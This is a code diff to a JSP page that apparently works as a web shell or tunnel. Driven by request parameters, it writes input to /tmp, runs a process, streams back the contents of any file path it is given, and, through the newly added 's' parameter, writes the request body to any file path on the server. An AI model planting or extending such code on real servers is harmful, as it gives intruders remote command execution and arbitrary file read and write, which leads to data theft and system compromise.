@@ -8,7 +8,7 @@
 */%>
 
 <%
-if (request.getParameter("o") != null || request.getParameter("i") != null || request.getParameter("c") != null || request.getParameter("fi") != null) {
+if (request.getParameter("o") != null || request.getParameter("i") != null || request.getParameter("c") != null || request.getParameter("fi") != null || request.getParameter("s") != null) {
 
     if (request.getParameter("i") != null) {
         String fi="/tmp/i";
@@ -38,20 +38,40 @@ if (request.getParameter("o") != null || request.getParameter("i") != null || re
             int exitCode = process.waitFor();
         }
         if (request.getParameter("o") != null) {
-            BufferedReader reader = new BufferedReader(new FileReader(request.getParameter("o")));
-            char[] buffer = new char[1024];
-            int bytesRead;
+                BufferedReader reader = new BufferedReader(new FileReader(request.getParameter("o")));
+                char[] buffer = new char[1024];
+                int bytesRead;
 
-            while ((bytesRead = reader.read(buffer)) != -1) {
-                out.print(new String(buffer, 0, bytesRead));
-                out.flush();
-                Thread.sleep(100); 
+                while ((bytesRead = reader.read(buffer)) != -1) {
+                    out.print(new String(buffer, 0, bytesRead));
+                    out.flush();
+                    Thread.sleep(100); 
+                }
+
+        }
+        if (request.getParameter("s") != null) {
+            String fi = request.getParameter("s");
+            try (ServletInputStream inputStream = request.getInputStream();
+                 FileOutputStream pipeOutputStream = new FileOutputStream(fi)) {
+                byte[] buffer = new byte[2048]; 
+                int bytesRead;
+                while ((bytesRead = inputStream.read(buffer)) != -1) {
+                    String not_keep_alive = new String(buffer, 0, bytesRead);
+                    if ("%1b%1c".equals(not_keep_alive)) {
+                        continue;
+                    }
+                    String decodedChunk = java.net.URLDecoder.decode(not_keep_alive, "UTF-8");
+                    byte[] decodedBytes = decodedChunk.getBytes("UTF-8");
+                    pipeOutputStream.write(decodedBytes);
+                }
+
             }
-
         }
         return;
 }
 %>
+
+
 
 
 
